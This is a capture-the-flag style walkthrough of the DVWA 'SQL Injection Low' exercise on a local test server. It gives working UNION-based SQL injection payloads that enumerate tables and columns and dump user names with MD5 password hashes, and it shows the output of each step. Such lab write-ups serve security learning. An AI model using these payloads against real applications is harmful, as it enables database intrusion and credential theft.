# SQL Injection Low

## <span style="color:red;">DONT OPEN My Solution IF YOU DON'T SOLVE IT</span>

<details>
<summary>My Solution</summary>


1. if You submit '

    you get 

    <code>
    Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1 in C:\xampp\htdocs\1\vulnerabilities\sqli\source\low.php:11 Stack trace: #0 C:\xampp\htdocs\1\vulnerabilities\sqli\source\low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...') #1 C:\xampp\htdocs\1\vulnerabilities\sqli\index.php(34): require_once('C:\\xampp\\htdocs...') #2 {main} thrown in C:\xampp\htdocs\1\vulnerabilities\sqli\source\low.php on line 11</code>

<br>

2. then you can submit ' order by 3 -- 
 
    you get error message but if you submit ```' order by 2 --``` you dont have this and its mins you have 2 culumns
    
<br>

3. next you can submit ' union select 1,2 --

    you get this

    <code>
    ID: ' union select 1,2 -- 
    <br><br>
    First name: 1
    <br><br>
    Surname: 2
    </code>

<br>

4. then you can submit ' union select database(),version() -- 

    you get database name and version

    <code>
    ID: ' union select database(),version() -- 
    <br><br>
    First name: dvwa
    <br><br>
    Surname: 10.4.25-MariaDB
    </code>

<br>

5. then you can submit ' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 

    you get table names

    <code>
    ID: ' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --
    <br><br>
    First name: 1
    <br><br>
    Surname: guestbook,users
    </code>

<br>

6. next you can submit ' union select 1,group_concat(0x3c68723e,column_name) from information_schema.columns where table_name=0x7573657273 -- 

    0x3c68723e = hex for 'hr' tag

    0x7573657273 = hex for 'users'

    <br>
    you get column names
    <br><br>

    <code>
    ID: ' union select 1,group_concat(0x3c68723e,column_name) from information_schema.columns where table_name=0x7573657273 -- 
    <br>
    First name: 1
    <br>
    Surname: <hr>user_id,<hr>first_name,<hr>last_name,<hr>user,<hr>password,<hr>avatar,<hr>last_login,<hr>failed_login,<hr>id,<hr>Infractions,<hr>Description,<hr>USER,<hr>CURRENT_CONNECTIONS,<hr>TOTAL_CONNECTIONS,<hr>id,<hr>username,<hr>password
    </code>

<br>

7. next you can submit ' union select 1,group_concat(0x3c68723e,user,0x3a2d3e3a,password) from users -- 

    0x3c68723e = hex for 'hr' tag

    0x3a2d3e3a = hex for ':->:'

    <br>
    you get users and password column data with md5 password
    <br><br>

    <code>
    ID: ' union select 1,group_concat(0x3c68723e,user,0x3a2d3e3a,password) from users -- 
    <br>
    First name: 1
    <br>
    Surname: <hr>admin:-&gt;:5f4dcc3b5aa765d61d8327deb882cf99,<hr>gordonb:-&gt;:e99a18c428cb38d5f260853678922e03,<hr>1337:-&gt;:8d3533d75ae2c3966d7e0d4fcc69216b,<hr>pablo:-&gt;:0d107d09f5bbe40cade3de5c71e9e9b7,<hr>smithy:-&gt;:5f4dcc3b5aa765d61d8327deb882cf99
    </code>

    </details>

</details>        